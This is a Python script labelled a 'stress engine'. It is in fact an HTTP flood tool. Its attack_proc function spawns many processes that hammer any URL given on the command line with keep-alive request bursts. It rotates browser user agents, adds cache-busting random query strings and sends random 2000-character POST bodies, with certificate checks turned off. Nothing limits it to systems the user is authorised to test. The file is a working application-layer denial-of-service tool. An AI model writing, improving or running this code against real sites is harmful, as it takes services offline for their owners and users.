import sys
import multiprocessing
import time
import random
import string
import socket
import ssl

# Monster Stres Engine V7 (WRK-Style) - Debug Edition
# Fixed for Windows/Linux Cross-Platform Robustness

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
]

def get_random_string(length=8):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shared_err):
    from urllib.parse import urlparse
    try:
        parsed = urlparse(target_url)
        host = parsed.netloc
        path = parsed.path if parsed.path else "/"
        scheme = parsed.scheme
    except Exception as e:
        host, path, scheme = target_url, "/", "http"

    target_port = int(port) if port else (443 if scheme == 'https' else 80)
    
    while time.time() < end_time:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)
            
            if scheme == 'https' or target_port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host if not host.replace('.','').isdigit() else None)
            
            s.connect((host, target_port))
            s.settimeout(1)

            for _ in range(50):
                if time.time() >= end_time: break
                
                curr_path = path
                if mode in ['3', '4']:
                    sep = '&' if '?' in path else '?'
                    curr_path = f"{path}{sep}sb={get_random_string(6)}"

                method = "GET"
                post_data = ""
                if mode == '4' and random.random() > 0.5:
                    method = "POST"
                    post_data = "data=" + get_random_string(2000)

                headers = (
                    f"{method} {curr_path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    "Connection: keep-alive\r\n"
                    "Accept-Encoding: gzip\r\n"
                )
                
                if method == "POST":
                    headers += f"Content-Length: {len(post_data)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{post_data}"
                else:
                    headers += "\r\n"

                payload = headers.encode('utf-8')
                s.sendall(payload)
                
                with shared_req.get_lock(): shared_req.value += 1
                with shared_bytes.get_lock(): shared_bytes.value += len(payload)

                # Safe Recv (Discard)
                try:
                    data = s.recv(1024)
                    if not data: break
                    with shared_bytes.get_lock(): shared_bytes.value += len(data)
                except:
                    pass

        except Exception:
            with shared_err.get_lock(): shared_err.value += 1
            time.sleep(0.5) # Prevent CPU spin on constant error
        finally:
            if s:
                try: s.close()
                except: pass

def main():
    if len(sys.argv) < 6:
        print("[!] Missing arguments. Expected 5, got", len(sys.argv)-1)
        sys.exit(1)

    url, th_count, duration, port, mode = sys.argv[1:6]
    print(f"[*] Engine Initialized. Target: {url}, Workers: {th_count}")
    sys.stdout.flush()

    try:
        th_count = int(th_count)
        duration = int(duration)
    except:
        print("[!] Invalid thread/duration format.")
        sys.exit(1)

    shared_req = multiprocessing.Value('i', 0)
    shared_bytes = multiprocessing.Value('Q', 0)
    shared_err = multiprocessing.Value('i', 0)

    end_time = time.time() + duration
    processes = []
    
    for i in range(th_count):
        p = multiprocessing.Process(target=attack_proc, args=(url, end_time, port, mode, shared_req, shared_bytes, shared_err))
        p.daemon = True
        p.start()
        processes.append(p)

    print(f"[*] {len(processes)} Processes running.")
    sys.stdout.flush()

    start_time = time.time()
    last_bytes = 0
    try:
        while time.time() < end_time:
            time.sleep(1)
            elapsed = int(time.time() - start_time)
            curr_bytes = shared_bytes.value
            mbps = ((curr_bytes - last_bytes) * 8) / (1024 * 1024)
            last_bytes = curr_bytes
            print(f"PROGRESS:{elapsed}:{duration} | REQ: {shared_req.value} | THROUGHPUT: {mbps:.2f} Mbps | ERRORS: {shared_err.value}")
            sys.stdout.flush()
    except KeyboardInterrupt:
        pass

    for p in processes: p.terminate()
    print("[*] Operation Finished.")

if __name__ == "__main__":
    main()
